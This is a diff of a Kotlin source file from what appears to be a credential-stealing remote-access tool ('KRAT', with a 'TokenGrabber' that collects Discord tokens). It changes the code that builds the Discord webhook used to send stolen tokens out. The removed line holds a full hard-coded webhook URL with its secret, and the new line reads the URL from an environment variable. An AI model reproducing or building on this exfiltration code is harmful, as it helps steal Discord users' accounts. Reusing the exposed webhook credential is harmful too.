@@ -1,13 +1,14 @@
 package services
 
 import KRAT.user
+import io.github.cdimascio.dotenv.dotenv
 import services.discord.TokenGrabber.getTokens
 import utils.DiscordWebhook
 import utils.ListUtils.removeDuplicates
 
 object Discord {
     fun webhook(): DiscordWebhook {
-        return DiscordWebhook("https://discord.com/api/webhooks/1289937157145886800/dz8f1OAp8FczOWgGUe78fJSxi4Ogv3XySkoemeiaWazv680BUYWDDng83Ob7N_yGigJJ").apply {
+        return DiscordWebhook(dotenv()["WEBHOOK_URL"]).apply {
             username = user
         }
     }
